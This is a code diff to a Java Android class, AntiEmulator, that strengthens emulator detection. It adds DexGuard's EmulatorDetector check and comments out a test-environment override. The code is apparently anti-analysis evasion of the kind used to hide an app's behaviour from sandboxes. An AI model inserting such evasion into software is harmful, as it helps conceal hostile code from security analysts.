@@ -10,6 +10,9 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.crypto.Digest;
 import com.android.mm.M;
 
+import dexguard.util.DebugDetector;
+import dexguard.util.EmulatorDetector;
+
 public class AntiEmulator {
 	private static final String TAG = "AntiEmulator";
 
@@ -303,14 +306,17 @@ public class AntiEmulator {
 	}
 
 	public boolean isEmu() {
+		int rand = Utils.rand.nextInt();
+		boolean isEmulator = EmulatorDetector.isRunningInEmulator(Status.getAppContext(), rand) == rand;
+
 		if (Cfg.DEBUGANTI) {
 			Log.w(TAG, " (isEmu)");
 			return isEmu(NUMTESTSNOTM) >= NUMTESTSNOTM - 2;
 		} else {
-			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 1;
-            boolean ov = isTestEmu();
+			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 1 || isEmulator;
+            //boolean ov = isTestEmu();
 
-            return ret && !ov;
+            return ret;
 		}
 	}
 
